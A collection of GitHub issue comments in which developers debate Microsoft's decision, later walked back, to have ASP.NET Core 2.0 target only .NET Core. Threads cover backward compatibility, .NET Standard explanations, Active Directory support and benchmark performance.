942	Another proven method to move forward instead of staying in a deadlocked past is just to accept that haters gonna hate and break things anyway (cf. Angular 2+ and Python 3, both of which are doing just fine).
943	@NickCraver I bet you $100 that whenever they finally make this break, whether it's 3.0, 2.2, or 23.5, there'll be just as much wailing and rending of garments from the peanut gallery as there is today.
944	"> Another proven method to move forward instead of staying in a deadlocked past is just to accept that haters gonna hate and break things anyway (cf. Angular 2+ and Python 3, both of which are doing just fine).

Sure. Both have consequences though: the 'OS API' method is ugly and leads to a large API with many dead ends over the years. The 'angular/python' method breaks people's upgrade path and splits communities (dunno how fragmented the angular world is). In the light of ASP.NET core I don't know what route is better. From a technical point of view, the Python route is preferable of course. From a stability point of view, it's killing iMHO."
945	"Pretty much everyone in the Angular world went ""oh, yeah, that's _much_ better"" and starting migrating over. Python is one of the fastest-growing languages right now, and it's Python 3 that's driving that."
946	"> Personally I think the mistake was supporting full .NET from ASP.NET Core in the first place. It should have been a clean break right from the start.

Clearly there's some cost saving to that idea, but it's the complete opposite to the way MS built its totally dominant position:

* Windows ran DOS applications
* 32 bit Windows ran 16 bit Windows applications and DOS applications
* 64 bit Windows runs 32 bit and 64 bit applications
* .NET applications ran on all the relevant operating systems when it was released

These have been hugely difficult technical challenges and hugely expensive compromises, but they have reassured an entire generation of people who need to get stuff done using computers that MS is, roughly, on their side for the long haul.

It's hard not to look back at what was involved, technically, in things like the Win32/Win16 interop story or running DOS applications on Win3 -> Win95 -> WinNT and wonder if the grown-ups left the building some time ago.
"
947	"@markrendle 
> Pretty much everyone in the Angular world went ""oh, yeah, that's much better"" and starting migrating over.

You honestly want to compare Angular with the .NET runtime? Most people would love to immediately migrate over to .NET Core. But realistically they just can't. Either plenty of dependencies are not available, or there's a too high risk or simply too much cost."
948	"@markrendle 

> Pretty much everyone in the Angular world went ""oh, yeah, that's much better"" and starting migrating over. Python is one of the fastest-growing languages right now, and it's Python 3 that's driving that.

I think you're papering over the fact that Python 3 has been out for 9 years and finally it's becoming the default Python to use for new projects.  However, my Mac running the latest OSX...comes with Python 2.7.12. My NAS, same.  

Same goes for Angular - it's great if you're writing a dinky little demo app that you can port over to Angular2 in a matter of hours.  Out here in the real world, we're still using Angular 1 because migrating a 2-3 year old large application is a non-trivial effort.  It costs time and money to port and the business wants justification."
949	Is it possible to create a software driver somehow like the [IA-32 Execution Layer?](https://en.wikipedia.org/wiki/IA-32_Execution_Layer)
950	"@bradwilson 

> Frankly, the majority of this thread makes me very sad for the .NET community.

Will you lay no blame at Microsoft's feet here for their mis-steps that got us here in the first place?  .NET Core was supposed to be a clean break.  Then it wasn't.  The fact that they named it "".NET Core"" implies you know...the Core of .NET is there right?  And what is .NET?  Well for the past 15 years it's been .NET Full Framework.  If Microsoft wanted a clean break, it should have chosen a new name for this thing, stuck to its guns rather than go back and reintroduce all the old APIs, and let people choose between the old world and the new. The decision they're backpedaling on now would have left projects in one of 3 situations:

1. You're using ASP.NET MVC on the full framework and you can port to ASP.NET Core 1.X on full framework, but after that, you're SOL until you move to .NET Core.
2. You're using ASP.NET Core 1.X on the full framework and you must to port to .NET Core to move to ASP.NET Core 2.0
3. You're working on ASP.NET Core on .NET Core.

Assuming Microsoft had gone forward and not supported ASP.NET Core 2.0 on the full framework, folks in situations 1 & 2 had no clear/realistic path to moving existing applications to ASP.NET Core 2.0.  Folks in situation 1 might understand, but those in 2 would be justifiably angry. Situation 2 might be a small group, but this is Microsoft we're talking about, not some tiny open-source project maintained by one guy.  Businesses / people's livelihoods depend on these systems.  If they can't rely on Microsoft, next time you can bet your ass they won't use the platform. Trust matters.  In shops that are considering using a Microsoft stack - opponents would use this as a cautionary tale.

I lay the blame for this problem on Microsoft's terrible messaging / marketing / naming of .NET Core.  You can't please everyone all the time, but half the battle is setting the right expectations from the start."
951	@MartinJohns I was responding to the previous comment.
952	"@markrendle  why laugh? explain please.  if the ""API is pretty much the same"" ,  the fundamental changes  like the strings maybe can be handled by this way. and If there are changes in the API, could be a separate package only if somebody wanted to use it, in .Net Core ?"
953	"OK guys - think Internet Explorer. Microsoft is _finally_ killing it off. Of course, they waited so long to do so that their replacement browser, Edge, is probably still born in the marketplace. Everybody just uses Chrome. And still there are lots of places where people use IE because there is no business value to upgrading their apps to use a modern browser and there are still people who complain about Microsoft ever so slowly pulling the plug.

ASP.NET Core is Microsoft's shot at replacing .NET with something based on what we have all learned in the last 15 years or so. Making it easy for developers to continue using the .NET Windows frameworks while providing the new ASP.NET Core features smells a lot like IE 9.  Better to tie support for .Net 4.x to the support lifetime of the OS they were shipped on and move on. "
954	@glennsills I'm missing the parallel between IE & Edge.  IE still ships with Windows because some things won't work in Edge.  I'm not mad that Edge doesn't support my work's VPN - it's fine...it's a different browser. It even has a totally different name so I don't have any preconceived notions that it should support ActiveX ;)
955	@glennsills what mistakes do you refer to?
956	"@markrendle ""Pretty much everyone in the Angular world went ""oh, yeah, that's much better"" and starting migrating over. "" 

You really are doing your arguments a disservice by picking bad examples like this. If anything, the way they handled the transition cost them their lead (which they had by a wide margin at the time). 
Same with python 3 - the fragmentation killed any momentum they had for *years*."
957	"So, I'm just trying to understand something here.
I was planning on converting an old Asp web forms application which uses .Net Remoting over to an Asp .Net core MVC application. My plan was to continue using .Net Remoting until we get a chance to remove that crap from our system. By the sounds of it, if I targeted Asp .Net Core 2.0 I will not be able to do this? But if I targeted Net Core 1.1 I would?"
958	"@wbuck As of yesterday, the story is that it's only in a single preview version of the ASP.NET Core 2.0 that you won't be able to build against the full framework.  Presumably in 2.0-preview-2 they'll bring this capability back.  So for the moment you could target 1.1 but not 2.0-preview-1.

Who knows what the longer-term future is - clearly the full framework will *eventually* be dropped - the timescale is anyone's guess."
959	"@popcatalin81 Well, if you want to run on multiple platforms, access COM objects is definitely a mistake.  There are lots of things like this that might not be 'mistakes' if you are only going to run on Windows but are if you want to be cross-platform.  Think about the coupling of AspNET to IIS. At the time it was OK but over time it made the stack hyper-complicated (even on Windows) and it makes running applications on other web servers a pain.  The lack of dependency injection by default in ASP.NET makes unit testing things like controllers a real drag. This is less of a 'mistake' that an example of time marching on and people understanding a better way to do things.

@GiorgioG  - yeah that's sort of my point. You get to choose between IE and Edge on Windows 10, but you have to _choose_.  You don't get IE features in Edge and that's on purpose - making IE and Edge features work simultaneously in one process would be a white hot mess.  Also, future support for IE is limited to bug fixes.  If Microsoft had done this 10 years ago, Edge would be much more competitive to Chrome than it is now. So I think Microsoft should continue to support .NET Classic for quite some time but in more of a bug fix mode. Asp.Net Core should focus on cross platform ease of development and performance.  "
960	Is there any official announcement for the cancellation?
961	"@pantonis 
> Is there any official announcement for this?

No, there is not. There are contradicting statements by different team members. @DamianEdwards and @davidfowl said in this issue that it was a deliberate decision to drop support. Jeffrey wrote on the ASP.NET Blog post that support for .NET will continue. But they did not refer to each other."
962	"Hi guys,

I didn't jump on the issue thread this time around but I'm very satisfied with the time it took to rectify the message and the direction.

I understand that the initial decision was taken at the last minute to make everything works prior to BUILD. Stating your intentions to have it run .NET Standard 2.0 is also very reassuring. 

Thank again to the .NET Team for the fast feedback and trying to get our needs despite all the unproductive comments.

Very appreciated. "
963	@MartinJohns  Oh boy.. So who is correct?
964	"@wbuck 

Your future use of .NET Remoting is emblematic of the problems created by promising people backward compatibility. Remoting just didn't work out for a variety of reasons but because people used it in the past (to be fair because somebody at Microsoft told them this was a good idea) they still want to use it. Accessing information in an ASP.NET Core application via WEB API is quite easy and you can call it from very old .NET   @@frameworks.

As a snarky co-worker of mine once said 'we need to stop building new legacy applications'. Building a ASP.NET server application that supports .NET Remoting is doing just that.
"
965	@pantonis Frankly, no idea. Many people in this issue jump ship and immediately take the blog post as a revert of the decision stated in this issue, because it came later. But I believe the statements in this issue and the blog post were made independently, and we still have no clear statement.
966	"@pantonis the most recent is the official announcement in the blog post

https://blogs.msdn.microsoft.com/webdev/2017/05/10/aspnet-2-preview-1/

> ## Preview 1 Issues
> This preview version of ASP.NET Core 2.0 ships with support for the .NET Core 2.0 SDK only.  **Our goal is to ship ASP.NET Core 2.0 on .NET Standard 2.0 so applications can run on .NET Core, Mono and .NET Framework.**  
>
> As the team was working through the last of their issues before Build, it was uncovered that the preview of ASP.NET Core 2.0 utilized API’s that were outside of .NET Standard 2.0, preventing it from running on .NET Framework. 
>
> *Because of this we limited Preview 1 support .NET Core only so it would not break a developer upgrading an ASP.NET Core 1.x application to ASP.NET Core 2 preview on .NET Framework.*"
967	"@benaadams But the statement in that blog post makes no sense in correlation with the statements made here. In the blog post they just mention that it was ""uncovered"" and that they limited ""Preview 1 support"". In this issue they mentioned the whole time something else. And they made no reference to the discussion here in the blog post.

It would be great if we could get an official acknowledgement of the statements in the blog post *here in this issue*. Or make the blog post acknowledge the discussion made here. Something so we know these different persons are aware of each others statements."
968	"The blog post is an official communication which clearly supersedes the unofficial community discussion we had here. And if it doesn't entirely match up, well, I'm sure we all understand the exigencies of corporate communication and that telling the right story to the right audience can be more important than being technically correct.

There's no need to try and make specific people eat their words or something - what's important is that the direction chosen seems to be a good one which, we can safely infer, was responsive to our feedback."
969	I hope Microsoft will issue a statement which clears the confusion. Come on MS you can do it!!!
970	"@pantonis @MartinJohns 

I can only confirm this unofficially since I'm not with MS. 
The blog post from yesterday is the plan forward, and those working on asp.net core are very much in line with it.

tl;dr: This is the plan forward: https://blogs.msdn.microsoft.com/webdev/2017/05/10/aspnet-2-preview-1/"
971	@pantonis The official announcement is the official statement. 
972	statement?
973	"> @PinpointTownes: Perhaps you should re-open this issue, as it's not as clear as you think it is.

Done 😄 "
974	"@pantonis just a few comments above. 

https://github.com/aspnet/Home/issues/2022#issuecomment-300774201"
975	"> I hope Microsoft will issue a statement which clears the confusion. Come on MS you can do it!!!

To be fair to them, they're all too busy prancing around in a state of forced *super*-excitedness this week to be wasting time here.  And given that every explanation of .NET Core ever given has only served to *reduce* the level of understanding in the world, perhaps it's better just to let things lie."
976	"Just to make things clearer to anyone reading this far...

If a more recent official announcement contradicts anything in this thread, we should consider the public official announcement as overriding what was said before in this thread.

Official Blog Post > GitHub comment

It's not written anywhere but, for me, this rule has held true for a long time."
977	"@MaximRouiller 

If it wasn't the case then @benaadams would probably know.
And I also talked to @davidfowl a few hours ago. The announcement is correct.

Edit: This announcement: https://blogs.msdn.microsoft.com/webdev/2017/05/10/aspnet-2-preview-1/"
978	@hallatore Which announcement? On the ASP.NET blog post from Jeffrey or the other one?
979	"Let it go. 

The statement is that .NET Framework isn't supported in ASP.NET 2.0 preview 1; however they are planning on supporting it after that. The sky is no longer falling in.

To continue complaining about it after the fact; will likely justify them engaging less, sharing ideas less, involving people at early stages less, so informing people at much later stages; with more clinically analysed responses; when its also harder to change direction.

If you jump on someone for making, in your view, a wrong decision; then they change their mind based on your feedback; then you rub their nose in it for changing their decision - how do you think that will play out for future relations? Its going to get dysfunctional really fast. 

The newer more open MS; which directly engages with developers and customers is exciting. Please don't though your actions shut it down and make everything have to go via public relations approval first. That's not good for anyone.

Be a little more professional and consider how we all move forward, together, for a better ecosystem."
980	"@benaadams You're confusing the wish for clear communication with complaint. This is by far no attempt to drive anyone away, but the wish for them to further engage and clear confusion. You say they changed their mind based on our feedback - which is great. But the blog post makes no mention of this, so it's purely your assumption that this is the case.

This breaking change was poorly announced. The apparently reverted decision was poorly announced. I don't wish for less engagement, but for more engagement."
981	"@MartinJohns In public announcement, you talk about the NOW and what IS. 

Not how you got to that point. The fact is exactly what @benaadams said. 

^Insert Let it go GIF here^"
982	@benaadams agreed. It might be a good thing though that within time (i.e. after //build) some more technical info is provided what the consequences are for the list of items @davidfowl put forward which were difficult/hard to do on .net full and why they needed the clean break. I see no reason why that should be done elsewhere than in this thread though and informal, developers to developers. IMHO it would both give more insight in future plans what to expect now from aspnetcore 2.0 and what now can't be done in this timeframe and thus has to be postponed. It also would help regain the trust of people here who lurked/only read the thread (and drew their conclusions...) and people here who have doubts still. 
983	"As we've had a very long, good discussion going on for a few days, I would also expect an 'official' announcement here in this thread rather than sudden silence and being pointed at an announcement on a blog with no mention of this discussion.

That doesn't change the fact that if the announcement is correct, this is good news of course."
984	"Sorry about this but i just want to clear my understanding of this up

![image](https://cloud.githubusercontent.com/assets/1824684/25950868/e53946dc-3653-11e7-9179-6335d3085c7f.png)

using the above diagram as an example are we actually saying one way or another the future of ASP.NET Core is not actually to sit on the .NET Standard layer due to slowness but to have ASP.NET Core sit on .NET Core instead? whatever future version of this it will be in 2.0 or 3.0 etc.

so for example:-
.NET Core -> ASP.NET
or will it still be .NET Standard -> .NET Core -> ASP.NET Core"
985	"@lilpug That's the kind of diagram which illustrates my (unpopular ;-) point about the explanations only making things worse.  "".NET standard"" isn't a library, and ASP.NET Core shouldn't be inside a box that is a peer of .NET Framework.

The diagram is basically wrong and you should disregard it."
986	"Hi @willdean would you be able to supply a better example which is more appropriate?

but to be honest i used it as an example not to point .NET Standard out as library but more of an inherited position, putting the terminology aside i would still like to know if my view of this is somewhat correct in what i am thinking?"
987	"> would you be able to supply a better example which is more appropriate?

No, I think it defies representation in a diagram, or at least it defies the abilities of the authors of every diagram I've seen.  Even when @shanselman (a *consummate* communicator) writes an article trying to explain it all, it ends up with a bunch of ""terminological exactitudes"" to put it politely.

All attempts to put "".net standard"" on a diagram which has a bunch of code libraries on it are doomed, because it's an API spec, not a library, and so its existence is orthogonal to the libraries.

"
988	"The ASP.NET team should accept the burden of maintaining ASP.NET which, with all due respect, is not Angular at all. They should also consider the burden of speaking on behalf of Microsoft, while this might not be formally true, for sure it is unformally right and that also means that what the ASP.NET team does (or doesn't do) send shockwaves across the entire eco-system and directly or indirectly reflects priorities from Microsoft.

A quick example is support for AD: I don't know how on Earth this could be considered optional. Or better, I know since AD is for sure a relic from the pre-Internet era and that's something that will be phased out sooner or later but the fact is that if Microsoft/DNF doesn't even consider the effort of porting AD to its official ASP.NET Core framework (except for a vague promise that it will be added maybe before Summer...), the message is that technology is sidelined by Microsoft itself. Except that most Microsoft products require AD to work so how confident am I building a new virtualization cluster using AD while Microsoft thinks AD support is not so important ? That for sure is the wrong message to send unless you also add: from now on, stop adding AD to your infrastructure. That's what I meant when I said development in Microsoft is happening in a disconnected way.

The ASP.NET team learned in this thread that when they come up and state something, people hold emergency pre-crisis meetings, frantically look for information and think they made the wrong choice. That's what happens in real world because ASP.NET is a core technology (pun intended), not a simple library you could ignore if everything is working fine. So you want stability AND you also want improvements because that's how you work with core technologies.

Another silly example: popular IdentityServer4 stated that they will only support ASP.NET Core 1.1 so if anyone has a Core 1.0 application that they cannot convert what are they supposed to do ? Do you think it's fair to tell them that they should convert to avoid staying with old frameworks when their version is... what... 4 months old ? it's up to them ? Never. It's up to you to provide breaking changes only when actually unavoidable because the risk is to fragment the developers and, on a medium term, simply force people to switch.

Honestly, this backtracking doesn't fix anything. I knew that open sourcing .NET was the worst choice and mostly implied a disengagement by Microsoft. As someone before me said in this thread, .NET is basically a tool to support Azure now.

It's not that developers don't want to accept that change (or haters, like someone said like if we were schoolkids discussing about your hair color): they did but honestly Microsoft is not putting its weight behind this choice and using the change to pursue its business goals. We knew that supporting full .NET framework was possible and that was politics. And business remarks and comments here are way more important that technical ones because we can fix every technical problem. If this thread didn't teach you that the problem is not if we have UTF8 strings but people depending on these technologies for a living, honestly... 

Is that too much responsibility for the ASP.NET team? Maybe. If so, let those decisions to a ""super-team"" that will take the responsibility for the whole eco-system and platform.

I don't even know how that could be discussed on GitHub."
989	"@willdean ok lets put it in a different way ""not in a diagram"" :),

For example, if i build a library in .NET Standard 2.0 will this be supported in ASP.NET Core (.NET Core) (future wise) if so then it means ""NET Standard -> .NET Core -> ASP.NET Core"" if not then it means .NET Core is breaking away and will not utilise the base of NET Standard."
990	"@lilpug if a library is .NET Standard it can be used by anything in the layer above.

So a .NET Standard library can be used by .NET Framework, .NET Core, Xamarin, Mono, Unity etc as shown in the diagram.

.NET Standard is what libraries should ideally adhere to to allow maximum possible reach (and the lower the version the greater reach).

The layer above are app models; its what the exes/executables are. They are the final endpoints. 

So you have a .NET Framework exe and it will only run on Windows. 

A Xamarin executable; will run on iOS, Android, OSX (though you will need 3 different executables on for each). 

A .NET Core exe can be fully portable and run with the dotnet launcher `donet my.dll` or create specically targeted executables for a specific platform Windows, Linux, MacOS, Tizen and only run on those; and you can output a targeted executable (self contained) for all of the specific platform from the same code; if you want to do that.

> For example, if i build a library in .NET Standard 2.0 will this be supported in ASP.NET Core (.NET Core) 

Yes; and that was always the case. Even if the ASP.NET Core libraries did specifically target .NET Core so they could only be used on .NET Core; you could still use .NET Standard libraries in ASP.NET Core. That was never effected by anything raised in this issue."
991	"@benaadams thank you so much for this that makes a lot more sense. 

With the future end result being dropping support for the .NET full framework in ASP.NET Core whether it be in the next release or future releases i wanted to know for future libraries if we start building them ""if possible"" on the .NET Standard rather than .NET Framework 4.6+ and if this would help future proof us more for using ASP.NET Core as well as making it more compatible for other layers."
992	"The talk is tomorrow, so we have to wait and see.

https://channel9.msdn.com/Events/Build/2017/C9L18"
993	"@lilpug
> ok lets put it in a different way ""not in a diagram"" :),
> 
> For example, if i build a library in .NET Standard 2.0 will this be supported in ASP.NET Core (.NET Core) if so then it means ""NET Standard -> .NET Core -> ASP.NET Core"" if not then it means .NET Core is breaking away and will not utilise the base of NET Standard.

See .NET standard as an interface, which is implemented by 2 classes, one in .NET core and one in .NET full. Other implementations exist too, e.g. in xamarin and UWP. It's not a physical interface, it's a metaphor here, mind you. Now, if you write code which targets that _interface_ you can, at runtime, work with the implementation of that interface, be it a class in .net core or in .net full. 

So with netstandard2.0 an API interface has been defined which has *implementations* in various platforms, e.g. .net core, .net full, xamarin, uwp. So you can then write a library which is compatible with netstandard2.0, which means it *only* uses APIs which are in that standard API definition and this thus means the library will run on all platforms which have an implementation of that interface. 

ASP.NET core 2.0 being compatible with netstandard2.0 means that they will utilize only APIs in the netstandard2.0 so that means ASP.NET core 2.0 will run on all  platforms which have an *implementation* of netstandard2.0. 

(edit) drats, @benaadams beat me to it. "
994	"@lilpug if you make .NET Standard libraries and only use .NET Standard libraries all is well and you are future proofed.

The concern being raised was by people who are using libraries which, at this time, are not .NET Standard compatible; so these libraries cannot run on .NET Core 2.0

With ASP.NET Core libraries being made .NET Core 2.0 libraries it meant they couldn't run on Full Framework (though they could still use .NET Standard libraries)."
995	"i appreciate the feedback everyone, my main concern was that the first thread of this started with:-

> Earlier today, most of the ASP.NET Core 2.0 packages were updated to target netcoreapp2.0 instead of netstandard1.* and net4*

which made me worry that we were not only talking about dropping .NET Full Framework but also the base layer of .NET Standard as well.

thanks for clearing this up for me i appreciate it 👍 "
996	"For a post-mortem, there's something I'm seriously interested in clarifying:

> As the team was working through the last of their issues before Build, it was uncovered that the preview of ASP.NET Core 2.0 utilized API's that were outside of .NET Standard 2.0, preventing it from running on .NET Framework.

When you're targeting `netstandard1.3` and `net46`, like Kestrel (other packages have similar targets). How do you end up ""utilizing APIs that are outside of .NET Standard 2.0""?

AFAIK, `netstandard2.0` is a superset of both `netstandard1.3` _and_ `net46`, so I'm struggling to see how you could end up in a situation where you use APIs preventing you from running on .NET Framework. How would that project even compile? OK, maybe you use a separate package with some additional APIs, but in order to even reference such a package, it needs to support all target frameworks.

Surely there must be something about bait-n-switching and reference assemblies etc. I'm not getting here, or is the comment in the blog post just a way of pretending this was never a thing? 😕 

Also, why was there even a need to rush this change just before the preview? Is .NET Framework not a part of the test matrix?"
997	"@adrianlmm Thanks buddy. 

This should end comments for whether will support it or not which cause more confusion. As you said lets wait for the [event](https://channel9.msdn.com/Events/Build/2017/C9L18) 

And please let it be the last comment here so anybody who sees this thread for first time dont have to read all this long thread, but instead view the link to the event. 


"
998	"@pantonis 

https://www.youtube.com/watch?v=xz6OGVCdov8"
999	"@khellang

Maybe @benaadams knows.
I'm pretty sure he had some pull requests (possibly already merged?) containing stuff that does not work outside core."
1000	"@khellang The PRs that prompted this issue and the statement in the blog post are just plain inconsistent.  

If the facts actually were as described in the blog post (last minute realisation, temporary change), then why would a load of `#if NET46` code have been removed as part of this change?"
1001	"> why would a load of `#if NET46` code have been removed as part of this change?

@willdean Yeah, that's a good point. If you just change the target frameworks, the implicit defines would just be gone and so would the code (from the compiled binaries) ¯\\\_(ツ)\_/¯"
1002	For those looking for something official official in the meantime, it seems @migueldeicaza confirmed w/ the Register that ASP.NET Core 2 on .Net Standard 2 (and therefore NetFx) is the official plan: https://www.theregister.co.uk/2017/05/11/microsoft_backtracks_we_are_going_to_support_net_framework_with_aspnet_core_20/
1003	"> What about the compromises involved in maintaining compatibility with .NET Framework, will that hold back ASP.NET Core or impair its performance?

The answer, says de Icaza, is to use conditional code to “innovate and pursue performance. There is a spectrum of things you can do while still targeting the common denominator. You can always light up new things.” It is similar to how, on a PC, applications can support the latest CPU or GPU innovations while still running on old hardware. “If the CPU has new capabilities let’s use them, otherwise fall back to old code.”"
1004	"To clarify my earlier comment, since it seems to have been lost, I mentioned Angular 2 only because the comment before mentioned Angular 2, not because I thought it was a great analogy.

That said, it is pertinent to this discussion that the Angular team took what they had learned from building AngularJS, and applied it to the new technology that was available to them in the form of ES2016 and TypeScript, and broke with the old, slow, clunky, CPU-intensive code to build something _new_ that is exponentially better for building rich browser and mobile experiences. They took the hit, and Angular is better for it.

The full .NET framework is not the best thing to be building web applications on top of. It never will be. It just doesn't fit in a cloud-native, high-performance, cost-sensitive, distributed services world. That's the world that .NET Core is built for, and it's ever-changing. ASP.NET Core has dropped from 10th to 15th place on [TechEmpower Round 14](https://www.techempower.com/benchmarks/#section=data-r14&hw=ph&test=plaintext) because new things have come along in the last few months. No, benchmarks aren't everything, but they _are_ a thing, and being competitive is important.

So please, everyone, use this stay of execution wisely. If .NET Core 2.0, NetStandard2, and the increased compatibility with existing .NET packages (and hopefully the release of more actual `netstandard` packages) means that you can get off full .NET and onto Core, then do it. But if your millions of lines of legacy code mean that it's still not an option, then maybe that's God telling you to just stay on ASP.NET 4.7."
1005	"@tbprince 
> If this thread didn't teach you that the problem is not if we have UTF8 strings but people depending on these technologies for a living, honestly...

Thanks for your insightful post. Especially the line above is IMHO very insightful."
1006	@willdean there could be the expectation that stuff will be in an appropriate `netstandard2x` platform when Asp.Net Core targets it.
1007	"@FransBouma 

looks a bit ironic. I accept that. But I was tremendously serious."
1008	@stefanolson @alexwiese @yaakov-h As a aside XAML Standard 1.0 was just announced at Build https://github.com/microsoft/xaml-standard
1009	"@markrendle love you Mark, but you're missing the big picture here. The TechEmpower benchmarks are trivial in the grand scheme of things, and I say that as someone who spends a significant portion of his day job performance-optimizing NETFX code. The ASP.NET Core team might care about them as a means of comparing their progress against that of other competing technologies and it might impact attracting net new people to .NET Core away from other platforms like Node.JS, but to the developers responsible for creating hundreds of billions of dollars in accumulated business value that currently runs on IIS and Windows it's just a nice feature, not the holy grail.

Besides, .NET is already cloud-native, whatever that means - I've run large scale distributed applications on it (100s of millions of requests per day) and I didn't need Docker or Linux to do it. There are others on this thread who've done even larger scale than that I suspect. Doesn't mean that we don't want what .NET Core offers in terms of better performance (edit: and better deployment experience,) but it does mean that there's nothing technically stopping us from hitting that scale today.

Try telling the ASP.NET / NETFX developers who build finance applications that move hundreds of millions of dollars a day, healthcare applications that deliver treatment to patients, services that manage energy production and consumption, and real-time safety monitoring for transportation systems all over the world to throw away their ""legacy"" code and start over. These developers are the reason why the ASP.NET team is employed in the first place - they buy the MSDN licenses, the big Azure enterprise agreements, the giant Office subscriptions, and the large SQL Server deployments that fund the creation, development, and maintenance of these tools to begin with. 

What these folks are saying on the thread is ""in no way, shape, or form could I sell a change of this magnitude to my management for so little benefit."" Having a 10x improvement in request-per-second throughput is not a good tradeoff compared to the suspension of business activity it would require to replatform so abruptly, especially with the gaps in the two technologies being what they are today. @NickCraver did a good job of spelling that issue out in detail for SO on this thread. Platform migration, to be economical, must be done in parallel with going concerns of the business. These developers are not Luddites or idiots; they're constrained by the reality of the businesses that pay their salary and customers who use their software won't tolerate them taking months or years off to replatform their software without tremendous upside for said business and customers.

There's clearly a divide between two camps of people here: folks who want a greenfield future not constrained by .NET's past and folks who would *like to be able to have that, but recognize that it's not economically feasible for them right now*. The latter group already won the argument, and rightfully so, because they're the users who make up the biggest consumers of the .NET platform. The folks who are independent operators who can afford to adopt new technologies quickly are going to be stuck in the same boat as us, but that's the price they pay in exchange for free editions of Visual Studio, Code, great OSS tools from MSFT, et al.

That the enterprise / NETFX users bow to some sort of technical purity in the name of better benchmarks is an infeasible demand to make. Better for MSFT to do the brave thing *and make NETFX better in parallel with NET Core*, because that's what the customers are demanding in this thread.

.NET is a big tent and I admire the effort Microsoft is making to make it bigger with .NET Core and .NET Standard, and that effort should be lauded and supported by the community. But that being said, to disregard the 15+ years of adoption on NETFX (and its users) as some sort of inconvenient legacy that should be abandoned and forgotten post-haste is tone-deaf at best. Better to work with those developers to offer a clean, gradual migration path if the destiny is to eventually have the two platforms diverge. Maybe it would have been best if ASP.NET Core / .NET Core were branded as something entirely different with no relationship to .NET, but that bell can't be unrung and there's no going back now. So in the meantime, let's support Microsoft and hold them accountable too. "
1010	"@markrendle 

> The full .NET framework is not the best thing to be building web applications on top of. It never will be. It just doesn't fit in a cloud-native, high-performance, cost-sensitive, distributed services world. That's the world that .NET Core is built for, and it's ever-changing. ASP.NET Core has dropped from 10th to 15th place on TechEmpower Round 14 because new things have come along in the last few months. No, benchmarks aren't everything, but they are a thing, and being competitive is important.

> So please, everyone, use this stay of execution wisely. If .NET Core 2.0, NetStandard2, and the increased compatibility with existing .NET packages (and hopefully the release of more actual netstandard packages) means that you can get off full .NET and onto Core, then do it. But if your millions of lines of legacy code mean that it's still not an option, then maybe that's God telling you to just stay on ASP.NET 4.7.

Please try to refrain from being insensitive and instructing others where they should dedicate their future efforts, you have no idea how much time, effort, dedication and livelihoods there's at stake, everyone knows their own use-cases better than you and where they should dedicate their future efforts and will make their own informed decisions based on their own individual use-cases when the roadmaps becomes clearer. 

An official spokesperson for the ASP.NET team will make their own official announcements and commitments when they're good and ready, everyone can decide for themselves what they should do after we have a clearer picture of what the future direction of their chosen platform looks like.

You've been poisoned looking at a single benchmark and think it's some kind of justification for destroying trust, creating uncertainty, abandoning most of your existing user base and 15 years of sensible language and platform evolution. It may take longer, it may require a different architecture but performance can still be achieved whilst maintaining compatibility. Maximum performance whilst sacrificing all else isn't everything, most of the fastest frameworks are unknown and the top three frameworks are written in C/C++, if you want the fastest performance possible go build your empire on C/C++ - .NET Core will never reach the top spot. Kestrel is still recommended to be run behind a reverse proxy which is going to overshadow any marginal micro improvements regardless, so the main thing that's at stake is getting to bragging rights sooner. We all want faster performance, but we all want to create value and deliver solutions - platforms are an enabler, like most framework's they're a means to an end, to facilitate creating multiplicative value-added solutions of which vastly overshadows the value in the platform itself.

The best path forward is to accept whatever plan the ASP.NET team has in store for us and do our own bit to help move the platform forward, harboring on about what might have been doesn't do anyone any good. "
1011	I have a lot of concerns about this, especially as my application is reliant on Active Directory. I don't know if there currently is or ever will be a .NET Core solution for Active Directory access.
1012	@twilliamsgsnetx Active Directory is coming. There are some good posts in the first 100 comments further up.
1013	"@hallatore Yeah I was just reading Scott's post. Good stuff... wouldn't make much sense for Microsoft to pursue something that doesn't offer a solution to a Microsoft product. Heh.

Thanks! :+1: "
1014	@hallatore Do you know if Active Directory support is available in the recently released Preview? Or is it still slated for sometime in the summer? I've got a greenfield project that requires AD integration and I'd really like to use Core.
1015	@adam3039, you can use AD currently with Core 1.x if you're sitting on top of the .NET Framework. The System.DirectoryServices seems to be coming later on maybe in the next .NET Core 2.x preview?
1016	@snickler Thank you for the clarification! I only saw Azure AD authentication options when creating a new Core application on top of .NET Framework. I'll investigate further!
1017	"The point with the benchmarks is not the raw speed, it's the ability to deliver much better performance and scalability on the same hardware. That translates into delivering equivalent-to-current performance using much less hardware, which relates directly to delivering business value. It means you can run your systems on one tenth of your current hardware setup or cloud commitment. On top of that, because .NET Core supports modern patterns and practices, developers can work more effectively, iterate and innovate faster, push ahead delivering more and better solutions for their businesses.

I also strongly believe that for most of the systems that are at issue here, a properly-planned migration to a solid, robust service-oriented or microservice architecture, one chunk of monolith at a time, should be encouraged. It's great that there's a path to do that where you can pretty much just copy and paste some files or lines of code into new projects. You used to have to rewrite everything from COBOL to 4GL or whatever, which is why there's still so much COBOL running the world.

And if the worst case scenario is that you really are stuck on full fat Windows ASP.NET and IIS, that's far from the worst thing that could happen. You're still going to get all the cool C# stuff that's coming, and these things that go into .NET Core will get to you eventually, it'll just take a bit longer."
1018	@mythz I'm pretty sure what I was suggesting people should do was exactly what you said they should do.
1019	"@markrendle 

> The point with the benchmarks is not the raw speed, it's the ability to deliver much better performance and scalability on the same hardware. That translates into delivering equivalent-to-current performance using much less hardware, which relates directly to delivering business value. It means you can run your systems on one tenth of your current hardware setup or cloud commitment. On top of that, because .NET Core supports modern patterns and practices, developers can work more effectively, iterate and innovate faster, push ahead delivering more and better solutions for their businesses.

These are reasons for focusing on performance, which .NET Core already does and already delivers great performance, I'm not sure where you're pulling the 10x better utilization number from as that would put .NET Core 4.2x faster than the fastest C framework available and increasing the top-line numbers isn't going to make much of a difference as these numbers become marginalized as soon as they're made to serve real workloads. I agree delivering business value is important and cranking out faster performance numbers doesn't matter to organizations that can't migrate to .NET Core and .NET Core doesn't benefit from a smaller ecosystem, pool of knowledge, uncertainty, instability, poorer compatibility, etc.

The most valuable Internet properties were built with dynamic languages which aren't using the fastest frameworks, what matters more is a rich, vibrant, productive and stable ecosystem. For them scalability is more important than raw performance and even the slowest frameworks can be made fast with a good caching strategy, which is also more important than raw performance. 

> I also strongly believe that for most of the systems that are at issue here, a properly-planned migration to a solid, robust service-oriented or microservice architecture, one chunk of monolith at a time, should be encouraged. 

